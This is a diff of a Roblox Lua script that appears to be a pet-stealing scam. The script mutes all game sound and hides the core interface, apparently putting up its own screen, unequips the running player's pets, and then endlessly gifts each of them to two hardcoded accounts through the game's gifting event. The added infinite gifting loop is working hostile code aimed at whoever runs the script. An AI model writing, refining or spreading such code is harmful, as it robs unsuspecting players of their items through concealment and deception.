@@ -615,7 +615,6 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
         local usernames = {
             "Smiley9Gamerz",
             "BUZZFTWGOD"
-    
         }
 
         local receiverPlr
@@ -667,33 +666,24 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
-            for _, sound in ipairs(workspace:GetDescendants()) do
-                if sound:IsA("Sound") then
-                    sound.Volume = 0
-                end
+        for _, sound in ipairs(workspace:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
             end
+        end
 
-            for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
-                if sound:IsA("Sound") then
-                    sound.Volume = 0
-                end
+        for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
             end
-        
+        end
+
         game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
-
-        --[[for _, v in pairs(game:GetService("CoreGui").RobloxGui:GetDescendants()) do
-            if not v:IsA("LocalScript") then
-                pcall(function()
-                    v:Destroy()
-                end)
-            end
-        end]]
-        
         game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         CreateGui()
 
         if workspace:FindFirstChild("PetsPhysical") then
-            for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
+            for _, petMover in workspace.PetsPhysical:GetChildren() do
                 if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                     for _, pet in petMover:GetChildren() do
                         PetsService:UnequipPet(pet.Name)
@@ -704,144 +694,56 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
 
         for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
             if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
-                local tool = game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(tool.Name)
-                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                local tool = targetPlr.Backpack:WaitForChild(tool.Name)
+                RS.GameEvents.Favorite_Item:FireServer(tool)
             end
         end
 
+        -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
+        local function giftHeldPet()
+            local char = targetPlr.Character
+            if not char then return false end
+            local held = char:FindFirstChildWhichIsA("Tool")
+            if not held then return false end
 
-    -- [Previous code up to the safeFollow function remains unchanged]
+            local success, err = pcall(function()
+                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+            end)
 
-    local function safeFollow()
-        local offset = CFrame.new(0, 0, 0.5) -- Reduced offset for closer proximity
-        local conn = RunService.Stepped:Connect(function()
-            if receiverPlr.Character and targetPlr.Character then
-                local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
-                local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
-                if targetRoot and followerRoot then
-                    local distance = (targetRoot.Position - followerRoot.Position).Magnitude
-                    if distance > 5 then -- Ensure within 5 studs
-                        followerRoot.CFrame = targetRoot.CFrame * offset
+            if success then
+                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
+                return true
+            else
+                warn("Gift failed:", err)
+                return false
+            end
+        end
+
+        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
+        task.spawn(function()
+            while true do
+                task.wait(2)  -- Re-scan every 2 seconds
+                local currentPets = GetPlayerPets()
+                if #currentPets == 0 then continue end
+
+                for _, pet in ipairs(currentPets) do
+                    for _, tool in targetPlr.Backpack:GetChildren() do
+                        if tool:IsA("Tool")
+                        and tool:GetAttribute("ItemType") == "Pet"
+                        and tool:GetAttribute("PET_UUID") == pet.Id then
+
+                            print("Equipping & gifting:", tool.Name)
+                            targetPlr.Character.Humanoid:EquipTool(tool)
+                            task.wait(0.6)
+
+                            for i = 1, 3 do
+                                if giftHeldPet() then
+                                    break
+                                end
+                                task.wait(0.3)
+                            end
+                        end
                     end
                 end
             end
         end)
-
-        return {
-            Stop = function()
-                if conn then
-                    conn:Disconnect()
-                end
-            end
-        }
-    end
-
-    local inventory = targetPlr.Backpack
-
-    local function safeGiftTool(tool)
-        -- Verify both players and their characters exist
-        if not receiverPlr or not receiverChar or not targetPlr.Character then
-            warn("Gifting failed: Invalid receiver or target character")
-            return false
-        end
-
-        -- Ensure tool is in Backpack
-        if tool.Parent ~= inventory then
-            tool.Parent = inventory
-            task.wait(0.3)
-        end
-
-        -- Equip the tool
-        local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
-        if not humanoid then
-            warn("Gifting failed: No Humanoid found for targetPlr")
-            return false
-        end
-
-        humanoid:EquipTool(tool)
-        task.wait(0.6) -- Increased wait for server to register equip
-
-        -- Verify tool is equipped
-        if tool.Parent ~= targetPlr.Character then
-            warn("Gifting failed: Tool not equipped - " .. tool.Name)
-            tool.Parent = inventory -- Reset to Backpack
-            return false
-        end
-
-        if detectExecutor() == "Delta" then
-            task.wait(0.3)
-            local camera = workspace.CurrentCamera
-            local head = receiverChar and receiverChar:FindFirstChild("Head")
-
-            if head then
-                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
-                if onScreen then
-                    local x = screenPos.X
-                    local y = screenPos.Y
-
-                    print("Screen position of head:", x, y)
-
-                    -- Example mouse click:
-                    local VirtualInputManager = game:GetService("VirtualInputManager")
-                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
-                    task.wait(0.8)
-                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
-                else
-                    warn("Head not on screen")
-                    return false
-                end
-            end
-        else
-
-            -- Fire gifting event
-            local success, err = pcall(function()
-                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-                
-                -- Trigger proximity prompt if it exists
-                task.wait(0.5) -- Increased wait for prompt to appear
-                local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
-                if prompt then
-                    print("Triggering proximity prompt for " .. receiverPlr.Name)
-                    fireproximityprompt(prompt)
-                else
-                    warn("No proximity prompt found for " .. receiverPlr.Name)
-                end
-                return true
-            end)
-
-            -- Handle failure
-            if not success then
-                warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
-                tool.Parent = inventory -- Reset to Backpack
-                return false
-            end
-
-            task.wait(0.55)
-        end
-
-            -- Verify tool is no longer in possession (indicating successful gift)
-        task.wait(0.15) -- Increased wait to confirm gift
-        if tool then
-            tool.Parent = targetPlr.Backpack
-        end
-        return true
-
-    end
-
-    safeFollow()
-    task.wait(1)
-
-    -- Gifting loop
-    for _, pet in ipairs(pets) do
-        for _, tool in targetPlr.Backpack:GetChildren() do
-            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
-                print("Gifting:", tool.Name)
-                for attempt = 1, 3 do
-                    result = safeGiftTool(tool)
-                    if result then
-                        break
-                    end
-                end       
-            end
-        end
-    end
